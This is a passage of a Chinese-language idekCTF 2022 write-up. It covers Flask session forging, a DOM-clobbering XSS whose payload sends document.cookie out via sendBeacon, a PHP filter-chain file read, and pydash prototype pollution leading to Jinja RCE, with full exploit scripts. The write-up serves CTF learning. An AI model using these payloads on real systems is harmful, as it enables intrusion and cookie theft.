+    now = (time.mktime(datetime.datetime.strptime(log.split(<span class="hljs-string">&#x27;\n&#x27;</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>:<span class="hljs-number">20</span>], <span class="hljs-string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>).timetuple())) * <span class="hljs-number">1000</span>
+    <span class="hljs-keyword">return</span> SECRET_OFFSET,now
+
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    register()
+    login()
+    upload()
+    SECRET_OFFSET, now = read()
+    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
+        decoded = {<span class="hljs-string">&#x27;admin&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;uid&#x27;</span>: userinfo[<span class="hljs-string">&#x27;username&#x27;</span>]}
+        random.seed(<span class="hljs-built_in">round</span>(now + <span class="hljs-built_in">int</span>(SECRET_OFFSET)))
+        SECRET_KEY = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">hex</span>(random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">15</span>)) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>)]).replace(<span class="hljs-string">&quot;0x&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)
+        flag_url = baseurl + <span class="hljs-string">&quot;flag&quot;</span>
+        res = sess.get(flag_url, headers={<span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">f&#x27;session=<span class="hljs-subst">{flask_unsign.sign(decoded, SECRET_KEY)}</span>&#x27;</span>}).text
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;idek&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res:
+            now += <span class="hljs-number">1</span>
+            <span class="hljs-built_in">print</span>(now)
+            <span class="hljs-keyword">continue</span>
+        <span class="hljs-built_in">print</span>(res)
+        <span class="hljs-keyword">break</span></code></pre><h3 id="json-beautifier"><a class="header-link" href="#json-beautifier"></a>JSON Beautifier:</h3>
+<p>关键点在于 outputBox.innerHTML是没过滤的 可以看到csp是 <code>script-src &#39;unsafe-eval&#39; &#39;self&#39;; object-src &#39;none&#39;</code>; </p>
+<p>beautify 中，如果设置了 config.debug  JSON.stringify(userJson, null, cols)的输出会被eval()</p>
+<p>只要能控制 cols 就可以</p>
+<p>但是现在的问题是传统的clobbering不生效的 所以我翻了一些标签
+<a href="https://portswigger.net/research/dom-clobbering-strikes-back">https://portswigger.net/research/dom-clobbering-strikes-back</a> 找到了frameset</p>
+<pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">config</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">&amp;quot;</span>&lt;<span class="hljs-attr">head</span> <span class="hljs-attr">id</span>=<span class="hljs-string">debug</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">frameset</span> <span class="hljs-attr">id</span>=<span class="hljs-string">opts</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">eval(name)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">frameset</span>&gt;</span><span class="hljs-symbol">&amp;quot;</span>&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>&#x27;&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></code></pre><p>这样就能get到一个xss了 </p>
+<p>但我们现在有一个问题 首先刚才说的东西 eval()都在beautify()里面触发  只有beautify函数被加载时候才会生效</p>
+<p>所以需要用户输入和<code>DOMCharacterDataModified</code>事件被触发 但我们可以做到一个事情 首先在我们将上面属性都破坏的前提下 再加载一下main.js即可</p>
+<p>poc大概如下</p>
+<pre class="hljs"><code>{&quot;xxx&quot;:&quot;<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;navigator.sendBeacon(atob(/url/.source),document.cookie)&#x27;</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">&#x27;&lt;div id=json-input&gt;[-3]&lt;/div&gt;&lt;script defer src=/static/js/main.js&gt;&lt;/script&gt;&lt;iframe name=config srcdoc=<span class="hljs-symbol">&amp;quot;</span>&lt;head id=debug&gt;&lt;/head&gt;&lt;frameset id=opts cols=eval(name)&gt;&lt;/frameset&gt;<span class="hljs-symbol">&amp;quot;</span>&gt;&lt;/iframe&gt;&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>&quot;}</code></pre><h3 id="paywall"><a class="header-link" href="#paywall"></a>Paywall:</h3>
+<p>想看原理的移步陆队之前写的，由于有现成的工具直接当脚本小子即可</p>
+<p><a href="https://tttang.com/archive/1395/#toc_iconv-filter-chain">https://tttang.com/archive/1395/#toc_iconv-filter-chain</a></p>
+<p>本题是用php实现的一个blog系统，除开样式读取核心代码非常简单</p>
+<pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
+
+        error_reporting(<span class="hljs-number">0</span>);
+        set_include_path(<span class="hljs-string">&#x27;articles/&#x27;</span>);
+
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>])) {
+            <span class="hljs-variable">$article_content</span> = file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>], <span class="hljs-number">1</span>);
+
+            <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$article_content</span>, <span class="hljs-string">&#x27;PREMIUM&#x27;</span>) === <span class="hljs-number">0</span>) {
+                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Thank you for your interest in The idek Times, but this article is only for premium users!&#x27;</span>); <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> implement subscriptions</span>
+            }
+            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$article_content</span>, <span class="hljs-string">&#x27;FREE&#x27;</span>) === <span class="hljs-number">0</span>) {
+                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;article&gt;<span class="hljs-subst">$article_content</span>&lt;/article&gt;&quot;</span>;
+                <span class="hljs-keyword">die</span>();
+            }
+            <span class="hljs-keyword">else</span> {
+                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nothing here&#x27;</span>);
+            }
+        }
+           
+    <span class="hljs-meta">?&gt;</span>
+</code></pre><p>可以看到，对于文章内容前是<code>PREMIUM</code>的不能读取，<code>FREE</code>的则可以读
+很可惜我们的flag文件恰好前面也是<code>PREMIUM</code>，那么要想读取这个文件很显然我们可以配合php的filter构造出FREE四个字母也就可以实现读取了</p>
+<p class="img-container"><img src="https://imgur.com/WMKbVQF.png" alt=""></p>
+<p>下面是工具</p>
+<p><a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
+<p><a href="https://github.com/WAY29/php_filter_chain_generator">https://github.com/WAY29/php_filter_chain_generator</a></p>
+<p>发现直接生成出来的虽然有FREE，但是都无法看了</p>
+<pre class="hljs"><code><span class="hljs-attribute">FREE</span>�B�<span class="hljs-number">5</span>$TԕT���FV��F�F��U�E�<span class="hljs-number">7</span>V&#x27;<span class="hljs-number">65</span>##�u�C��W%��<span class="hljs-number">7</span>w<span class="hljs-number">5</span>�W<span class="hljs-string">&quot;����&gt;==�@C������&gt;==�@</span></code></pre><p>然而发现把每个环节的<code>convert.iconv.UTF8.UTF7</code>去掉</p>
+<p>就可以变成明文了，脚本小子表示很神奇，最后为了不丢失符号(毕竟Base64字符里面没有一些特殊符号<code>!{}!</code>之类的)，因此第一步事先base64enccode一下</p>
+<p>最终得到payload</p>
+<pre class="hljs"><code>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/?p=php://filter/<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-encode|<span class="hljs-built_in">convert</span>.iconv.IBM860.UTF16|<span class="hljs-built_in">convert</span>.iconv.ISO-IR-<span class="hljs-number">143.</span>ISO2022CNEXT|<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-decode|<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-encode|<span class="hljs-built_in">convert</span>.iconv.IBM860.UTF16|<span class="hljs-built_in">convert</span>.iconv.ISO-IR-<span class="hljs-number">143.</span>ISO2022CNEXT|<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-decode|<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-encode|<span class="hljs-built_in">convert</span>.iconv.PT.UTF32|<span class="hljs-built_in">convert</span>.iconv.KOI8-U.IBM-<span class="hljs-number">932</span>|<span class="hljs-built_in">convert</span>.iconv.SJIS.EUCJP-WIN|<span class="hljs-built_in">convert</span>.iconv.L10.UCS4|<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-decode|<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-encode|<span class="hljs-built_in">convert</span>.iconv.L5.UTF-<span class="hljs-number">32</span>|<span class="hljs-built_in">convert</span>.iconv.ISO88594.GB13000|<span class="hljs-built_in">convert</span>.iconv.CP950.SHIFT_JISX0213|<span class="hljs-built_in">convert</span>.iconv.UHC.JOHAB|<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-decode|<span class="hljs-built_in">convert</span>.<span class="hljs-built_in">base64</span>-encode/resource=flag</code></pre><p>但是根据这样构造本地发现会少最后三个字符，除开}符号还剩两个
+看看题目描述可以猜出最后俩字符，Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPPaper，最后一个字母肯定是个符号所以是!</p>
+<p><code>idek{Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPaper!}</code></p>
+<p class="img-container"><img src="https://imgur.com/nqwXgqR.png" alt=""></p>
+<p>当然最后发现工具也可以直接用，注意后面有俩空格</p>
+<pre class="hljs"><code><span class="hljs-keyword">python</span> php_filter_chain_generator.<span class="hljs-keyword">py</span> --chain <span class="hljs-string">&#x27;FREE  &#x27;</span></code></pre><p>得到</p>
+<pre class="hljs"><code><span class="hljs-attribute">php</span>://filter/convert.iconv.UTF<span class="hljs-number">8</span>.CSISO<span class="hljs-number">2022</span>KR|convert.base<span class="hljs-number">64</span>-encode|convert.iconv.UTF<span class="hljs-number">8</span>.UTF<span class="hljs-number">7</span>|convert.iconv.SE<span class="hljs-number">2</span>.UTF-<span class="hljs-number">16</span>|convert.iconv.CSIBM<span class="hljs-number">921</span>.NAPLPS|convert.iconv.<span class="hljs-number">855</span>.CP<span class="hljs-number">936</span>|convert.iconv.IBM-<span class="hljs-number">932</span>.UTF-<span class="hljs-number">8</span>|convert.base<span class="hljs-number">64</span>-decode|convert.base<span class="hljs-number">64</span>-encode|convert.iconv.UTF<span class="hljs-number">8</span>.UTF<span class="hljs-number">7</span>|convert.iconv.<span class="hljs-number">8859</span>_<span class="hljs-number">3</span>.UTF<span class="hljs-number">16</span>|convert.iconv.<span class="hljs-number">863</span>.SHIFT_JISX<span class="hljs-number">0213</span>|convert.base<span class="hljs-number">64</span>-decode|convert.base<span class="hljs-number">64</span>-encode|convert.iconv.UTF<span class="hljs-number">8</span>.UTF<span class="hljs-number">7</span>|convert.iconv.INIS.UTF<span class="hljs-number">16</span>|convert.iconv.CSIBM<span class="hljs-number">1133</span>.IBM<span class="hljs-number">943</span>|convert.iconv.GBK.SJIS|convert.base<span class="hljs-number">64</span>-decode|convert.base<span class="hljs-number">64</span>-encode|convert.iconv.UTF<span class="hljs-number">8</span>.UTF<span class="hljs-number">7</span>|convert.iconv.PT.UTF<span class="hljs-number">32</span>|convert.iconv.KOI<span class="hljs-number">8</span>-U.IBM-<span class="hljs-number">932</span>|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L<span class="hljs-number">10</span>.UCS<span class="hljs-number">4</span>|convert.base<span class="hljs-number">64</span>-decode|convert.base<span class="hljs-number">64</span>-encode|convert.iconv.UTF<span class="hljs-number">8</span>.UTF<span class="hljs-number">7</span>|convert.iconv.L<span class="hljs-number">5</span>.UTF-<span class="hljs-number">32</span>|convert.iconv.ISO<span class="hljs-number">88594</span>.GB<span class="hljs-number">13000</span>|convert.iconv.CP<span class="hljs-number">950</span>.SHIFT_JISX<span class="hljs-number">0213</span>|convert.iconv.UHC.JOHAB|convert.base<span class="hljs-number">64</span>-decode|convert.base<span class="hljs-number">64</span>-encode|convert.iconv.UTF<span class="hljs-number">8</span>.UTF<span class="hljs-number">7</span>|convert.iconv.<span class="hljs-number">863</span>.UNICODE|convert.iconv.ISIRI<span class="hljs-number">3342</span>.UCS<span class="hljs-number">4</span>|convert.base<span class="hljs-number">64</span>-decode|convert.base<span class="hljs-number">64</span>-encode|convert.iconv.UTF<span class="hljs-number">8</span>.UTF<span class="hljs-number">7</span>|convert.iconv.CP-AR.UTF<span class="hljs-number">16</span>|convert.iconv.<span class="hljs-number">8859</span>_<span class="hljs-number">4</span>.BIG<span class="hljs-number">5</span>HKSCS|convert.iconv.MSCP<span class="hljs-number">1361</span>.UTF-<span class="hljs-number">32</span>LE|convert.iconv.IBM<span class="hljs-number">932</span>.UCS-<span class="hljs-number">2</span>BE|convert.base<span class="hljs-number">64</span>-decode|convert.base<span class="hljs-number">64</span>-encode|convert.iconv.UTF<span class="hljs-number">8</span>.UTF<span class="hljs-number">7</span>|convert.iconv.PT.UTF<span class="hljs-number">32</span>|convert.iconv.KOI<span class="hljs-number">8</span>-U.IBM-<span class="hljs-number">932</span>|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L<span class="hljs-number">10</span>.UCS<span class="hljs-number">4</span>|convert.base<span class="hljs-number">64</span>-decode|convert.base<span class="hljs-number">64</span>-encode|convert.iconv.UTF<span class="hljs-number">8</span>.UTF<span class="hljs-number">7</span>|convert.base<span class="hljs-number">64</span>-decode/resource=flag</code></pre><p class="img-container"><img src="https://imgur.com/SBiDtA2.png" alt=""></p>
+<h3 id="task-manager"><a class="header-link" href="#task-manager"></a>task manager:</h3>
+<p>本题当时没有做出来属于赛后复现,不过比较有意思</p>
+<p>作者参考了部分来自以下文章的思路</p>
+<p><a href="https://blog.abdulrah33m.com/prototype-pollution-in-python/">https://blog.abdulrah33m.com/prototype-pollution-in-python/</a></p>
+<p>题目有点原型链污染的味道，也可以说是借鉴了pyjail的一些思路，很有意思的一道题目。
+作者提供了对于 <code>pydash.set_</code> 的封装，可以通过变量路径设置值，类似一个高级版的 <code>setattr</code>。比如：</p>
+<pre class="hljs"><code><span class="hljs-meta">&gt;&gt;&gt; </span>pydash.set_({<span class="hljs-string">&quot;A&quot;</span>:{<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>}}, <span class="hljs-string">&quot;A.B&quot;</span>, <span class="hljs-string">&quot;D&quot;</span>)
+{<span class="hljs-string">&#x27;A&#x27;</span>: {<span class="hljs-string">&#x27;B&#x27;</span>: <span class="hljs-string">&#x27;D&#x27;</span>}}</code></pre><h4 id="寻找访问-app-的方法"><a class="header-link" href="#寻找访问-app-的方法"></a>寻找访问 app 的方法:</h4>
+<p>在 <code>taskmanager.py</code> 里面调用 <code>pydash.set_()</code> 可以通过实例化的 <code>TaskManager</code> 对象利用特殊属性实现对 <code>app</code> 对象的修改：</p>
+<pre class="hljs"><code>pydash.set<span class="hljs-emphasis">_(
+    TaskManager(),
+    &#x27;<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__loader__</span>.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.sys.modules.<span class="hljs-strong">__main__</span>.app.xxx&#x27;,
+    &#x27;xxx&#x27;
+)</span></code></pre><h4 id="将-eval-加入模板全局变量"><a class="header-link" href="#将-eval-加入模板全局变量"></a>将 eval 加入模板全局变量</h4>
+<p>然后再回来看 <code>app.py</code> ，可以发现一段很奇怪的代码：</p>
+<p class="img-container"><img src="https://imgur.com/nbQ0LT4.png" alt=""></p>
+<p>既然 <code>app</code> 已经可控了，如果能够实现 <code>before_first_request</code> 的重复调用那么就可以在模板中实现任意代码执行了，经过一些寻找发现可以通过将 <code>app._got_first_request</code> 设置为 <code>False</code> 实现。</p>
+<h4 id="设法调用-eval"><a class="header-link" href="#设法调用-eval"></a>设法调用 eval</h4>
+<p>接下来就是寻找方法对已经放入模板全局变量的 <code>eval</code> 函数进行调用，而 <code>add_template_global</code> 函数是通过 <code>__name__</code> 来确定变量名字的，但是 builtin 函数的 <code>__name__</code> 是只读的，所以没有办法用来改个名字放进去，只有找现有文件中存在 eval 的来当作模板。在题目中只有 <code>app.py</code> 出现了 eval ，可以尝试利用。</p>
+<p>这里使用的方法是对 <code>app.jinja_env</code> 的 <code>variable_start_string</code> 和 <code>variable_end_string</code> 进行替换，原本 jinja 是通过识别 <code>{{.*}}</code> 来识别模板中的变量的，但是我们可以通过修改这两个值来更改 jinja 识别变量的方式，从而拼接出一个rce。</p>
+<h4 id="绕过-jinja-的目录穿越检查实现任意文件渲染"><a class="header-link" href="#绕过-jinja-的目录穿越检查实现任意文件渲染"></a>绕过 jinja 的目录穿越检查实现任意文件渲染</h4>
+<p>下面一个问题是现在只能够对 <code>templates</code> 下面的文件进行渲染，但是这里面的 html 很明显是用不了的，所以要想办法让他可以渲染任意文件，在 jinja 源码(<a href="https://github.com/pallets/jinja/blob/36b601f24b30a91fe2fdc857116382bcb7655466/src/jinja2/loaders.py#L24-L38">https://github.com/pallets/jinja/blob/36b601f24b30a91fe2fdc857116382bcb7655466/src/jinja2/loaders.py#L24-L38</a>) 可以看到是通过 <code>os.path.pardir</code> 来对目录穿越进行了保护，但是我们可以通过修改 <code>pardir</code> 的值来绕过。</p>
+<p>最后在对 <code>app.py</code> 进行利用的时候发现虽然出现了 <code>eval</code> ，但是并没有 <code>eval(.*)</code> 的形式出现，尝试通过修改 <code>app.jinja_env</code> 的 <code>comment_start_string</code> 和 <code>comment_end_string</code> 来让 jinja 把文件的一部分当作注释删掉来凑成一个 <code>eval(.*)</code> 的形式，但是 jinja 解析时会报错，后来发现 <code>{{ eval{# #}(.*) }}</code> 这种中间有注释的模板变量本来就不能正常解析，但是现在既然可以渲染任意文件了，所以可以尝试在 python 库里面寻找出现 <code>eval(.*)</code> 的文件，最后找到了 <code>turtle.py</code>。</p>
+<h4 id="exp"><a class="header-link" href="#exp"></a>exp:</h4>
+<pre class="hljs"><code><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> re
+
+base_url = <span class="hljs-string">&#x27;http://127.0.0.1:1337&#x27;</span>
+url      = <span class="hljs-string">f&#x27;<span class="hljs-subst">{base_url}</span>/api/manage_tasks&#x27;</span>
+exp_url  = <span class="hljs-string">f&#x27;<span class="hljs-subst">{base_url}</span>/../../usr/local/lib/python3.8/turtle.py&#x27;</span>
+app      = <span class="hljs-string">&#x27;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app&#x27;</span>
+
+<span class="hljs-comment"># add eval to template globals</span>
+requests.post(url, json={<span class="hljs-string">&quot;task&quot;</span>: <span class="hljs-string">f&quot;<span class="hljs-subst">{app}</span>.env&quot;</span>, <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;yolo&quot;</span>})
+requests.post(url, json={<span class="hljs-string">&quot;task&quot;</span>: <span class="hljs-string">f&quot;<span class="hljs-subst">{app}</span>._got_first_request&quot;</span>, <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-literal">None</span>})
+
+<span class="hljs-comment"># bypass jinja directory traversal check</span>
+requests.post(url, json={<span class="hljs-string">&quot;task&quot;</span>: <span class="hljs-string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.path.pardir&quot;</span>, <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;foobar&quot;</span>})
+
+<span class="hljs-comment"># change jinja_env</span>
+requests.post(url, json={<span class="hljs-string">&quot;task&quot;</span>: <span class="hljs-string">f&quot;<span class="hljs-subst">{app}</span>.jinja_env.variable_start_string&quot;</span>, <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;&quot;&quot;&#x27;&quot;&quot;&#x27;]:\n            value = &quot;&quot;&quot;</span>})
+requests.post(url, json={<span class="hljs-string">&quot;task&quot;</span>: <span class="hljs-string">f&quot;<span class="hljs-subst">{app}</span>.jinja_env.variable_end_string&quot;</span>, <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;\n&quot;</span>})
+
+<span class="hljs-comment"># add global vars</span>
+requests.post(url, json={<span class="hljs-string">&quot;task&quot;</span>: <span class="hljs-string">f&quot;<span class="hljs-subst">{app}</span>.jinja_env.globals.value&quot;</span>, <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag-*.txt&#x27;).read()&quot;</span>})
+
+<span class="hljs-comment"># get flag</span>
+s = requests.Session()
+r = requests.Request(method=<span class="hljs-string">&#x27;GET&#x27;</span>, url=exp_url)
+p = r.prepare()
+p.url = exp_url
+r = s.send(p)
+flag = re.findall(<span class="hljs-string">&#x27;idek{.*}&#x27;</span>, r.text)[<span class="hljs-number">0</span>]
+<span class="hljs-built_in">print</span>(flag)</code></pre><h4 id="非预期"><a class="header-link" href="#非预期"></a>非预期:</h4>
+<p>由于作者把 flag 写在 Dockerfile 里面了，并且在构建容器的时候是通过 <code>RUN echo &quot;idek{[REDACTED]}&quot; &gt; /flag-$(head -c 16 /dev/urandom | xxd -p).txt</code> 写的 flag 通过<code>COPY . .</code>添加的题目代码，这就意味着 Dockerfile 本身也被复制进了容器，所以在实现 LFI 之后就可以直接读取 Dockerfile 就可以拿到 flag 了</p>
+<pre class="hljs"><code><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> re
+
+base_url = <span class="hljs-string">&#x27;http://127.0.0.1:1337&#x27;</span>
+url      = <span class="hljs-string">f&#x27;<span class="hljs-subst">{base_url}</span>/api/manage_tasks&#x27;</span>
+exp_url  = <span class="hljs-string">f&#x27;<span class="hljs-subst">{base_url}</span>/../Dockerfile&#x27;</span>
+
+<span class="hljs-comment"># bypass jinja directory traversal check</span>
+requests.post(url, json={<span class="hljs-string">&quot;task&quot;</span>: <span class="hljs-string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.path.pardir&quot;</span>, <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;foobar&quot;</span>})
+
+<span class="hljs-comment"># get flag</span>
+s = requests.Session()
+r = requests.Request(method=<span class="hljs-string">&#x27;GET&#x27;</span>, url=exp_url)
+p = r.prepare()
+p.url = exp_url
+r = s.send(p)
+flag = re.findall(<span class="hljs-string">&#x27;idek{.*}&#x27;</span>, r.text)[<span class="hljs-number">0</span>]
+<span class="hljs-built_in">print</span>(flag)</code></pre><h4 id="通过-jinja2runtimeexported-实现-rce"><a class="header-link" href="#通过-jinja2runtimeexported-实现-rce"></a>通过 <code>jinja2.runtime.exported</code> 实现 rce</h4>
+<blockquote>
+<p><a href="https://github.com/Myldero/ctf-writeups/tree/master/idekCTF%202022/task%20manager">https://github.com/Myldero/ctf-writeups/tree/master/idekCTF%202022/task%20manager</a></p>
+</blockquote>
+<p>通过 jinja 源码(<a href="https://github.com/pallets/jinja/blob/main/src/jinja2/environment.py#L1208">https://github.com/pallets/jinja/blob/main/src/jinja2/environment.py#L1208</a>) 可以发现模板的生成其实是调用了 <code>environment.from_string</code>，而在 <code>from_string</code> 函数中又调用了(<a href="https://github.com/pallets/jinja/blob/main/src/jinja2/environment.py#L1105">https://github.com/pallets/jinja/blob/main/src/jinja2/environment.py#L1105</a>) <code>environment.compile</code>，并且对 <code>compile</code> 会返回一个 <code>code</code> 对象，后续会被 exec(<a href="https://github.com/pallets/jinja/blob/main/src/jinja2/environment.py#L1222)，如果我们能够控制这里">https://github.com/pallets/jinja/blob/main/src/jinja2/environment.py#L1222)，如果我们能够控制这里</a> exec 的内容那么就可以实现 rce。
+经过简单的调试可以 在这里(<a href="https://github.com/pallets/jinja/blob/main/src/jinja2/compiler.py#L839">https://github.com/pallets/jinja/blob/main/src/jinja2/compiler.py#L839</a>) 发现在生成代码的时候有一个可控变量 <code>exported_names</code>，他是 runtime(<a href="https://github.com/pallets/jinja/blob/main/src/jinja2/runtime.py#L45">https://github.com/pallets/jinja/blob/main/src/jinja2/runtime.py#L45</a>) 里面的一个数组，所以我们完全可以通过 <code>pydash.set_()</code> 来进行覆盖，从而达到 rce。</p>
+<pre class="hljs"><code><span class="hljs-keyword">import</span> requests, re
+
+base_url = <span class="hljs-string">&#x27;http://127.0.0.1:1337&#x27;</span>
+url      = <span class="hljs-string">f&#x27;<span class="hljs-subst">{base_url}</span>/api/manage_tasks&#x27;</span>
+flag_url = <span class="hljs-string">f&#x27;<span class="hljs-subst">{base_url}</span>/../../tmp/flag&#x27;</span>
+
+payload = <span class="hljs-string">&#x27;&#x27;&#x27;*
+__import__(&#x27;os&#x27;).system(&#x27;cp /flag* /tmp/flag&#x27;)
+#&#x27;&#x27;&#x27;</span>
+
+<span class="hljs-comment"># bypass jinja directory traversal check</span>
+requests.post(url, json={<span class="hljs-string">&quot;task&quot;</span>: <span class="hljs-string">&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.os.path.pardir&quot;</span>, <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;foobar&quot;</span>})
+
+<span class="hljs-comment"># replace exported to prepare rce</span>
+requests.post(url, json={<span class="hljs-string">&quot;task&quot;</span>: <span class="hljs-string">&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.jinja2.runtime.exported.0&quot;</span>, <span class="hljs-string">&quot;status&quot;</span>: payload})
+
+<span class="hljs-comment"># trigger rce</span>
+requests.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">{base_url}</span>/home.html&#x27;</span>)
+
+<span class="hljs-comment"># get flag</span>
+s = requests.Session()
+r = requests.Request(method=<span class="hljs-string">&#x27;GET&#x27;</span>, url=flag_url)
+p = r.prepare()
+p.url = flag_url
+r = s.send(p)
+flag = re.findall(<span class="hljs-string">&#x27;idek{.*}&#x27;</span>, r.text)[<span class="hljs-number">0</span>]
+<span class="hljs-built_in">print</span>(flag)</code></pre><h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto:</h2>
+<h3 id="cleithrophobia"><a class="header-link" href="#cleithrophobia"></a>Cleithrophobia:</h3>
+<p>以一段3*16bit长的明文为例，填充与加密流程如下（最后会将密文反序输出）：</p>
+<p>b1, b2, b3</p>
+<p>b0(rand), b1, b2, b3, b4(pad)</p>
+<p>b0, b0^E(b1), b1^E(b2), b2^E(b3), b3^E(b4)</p>
+<p>b0, D(b3^E(b4))^(b0), D(b2^E(b3))^(b3^E(b4)), D(b1^E(b2))^(b2^E(b3)), D(b0^E(b1))^(b1^E(b2))</p>
+<p>考虑在这个过程中构造加密、解密的payload</p>
+<p>Enc-payload：b0(rand), b&#39;\x00&#39;*16, b2, msg, b4(pad)</p>
+<ul class="list">
+<li>此时密文中D(b1^E(b2))^(b2^E(b3))=D(E(b2))^b2^E(msg)=b2^b2^E(msg)=E(msg)</li>
+</ul>
+<p>Dec-payload：b0(rand), b1, b2, msg^E(b4), b4(pad)</p>
+<ul class="list">
+<li>此时密文中D(b3^E(b4))^(b0)=D(msg^E(b4)^E(b4))^b0=D(msg)^b0，且b0已知
+至此即可将密文链条恢复到前一状态，进而得到明文</li>
+</ul>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+host, port = <span class="hljs-string">&#x27;cleithrophobia.chal.idek.team:1337&#x27;</span>.split(<span class="hljs-string">&#x27;:&#x27;</span>)
+io = remote(host, <span class="hljs-built_in">int</span>(port))
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">oracle</span>(<span class="hljs-params">payload</span>):</span>
+    io.sendlineafter(<span class="hljs-string">b&#x27;|    &gt; (hex) &#x27;</span>, payload.<span class="hljs-built_in">hex</span>().encode())
+    io.recvuntil(<span class="hljs-string">b&#x27;|\n|   &#x27;</span>)
+    now = <span class="hljs-built_in">bytes</span>.fromhex(io.recvline().strip().decode())
+    <span class="hljs-keyword">return</span> [now[i:i+<span class="hljs-number">16</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(now), <span class="hljs-number">16</span>)][::-<span class="hljs-number">1</span>]
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">enc</span>(<span class="hljs-params">block</span>):</span>
+    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(block) == <span class="hljs-number">16</span>
+    payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">32</span> + block
+    res = oracle(payload)
+    <span class="hljs-keyword">return</span> res[<span class="hljs-number">3</span>]
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dec</span>(<span class="hljs-params">block</span>):</span>
+    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(block) == <span class="hljs-number">16</span>
+    mask = enc(<span class="hljs-string">b&#x27;\x10&#x27;</span> * <span class="hljs-number">16</span>)
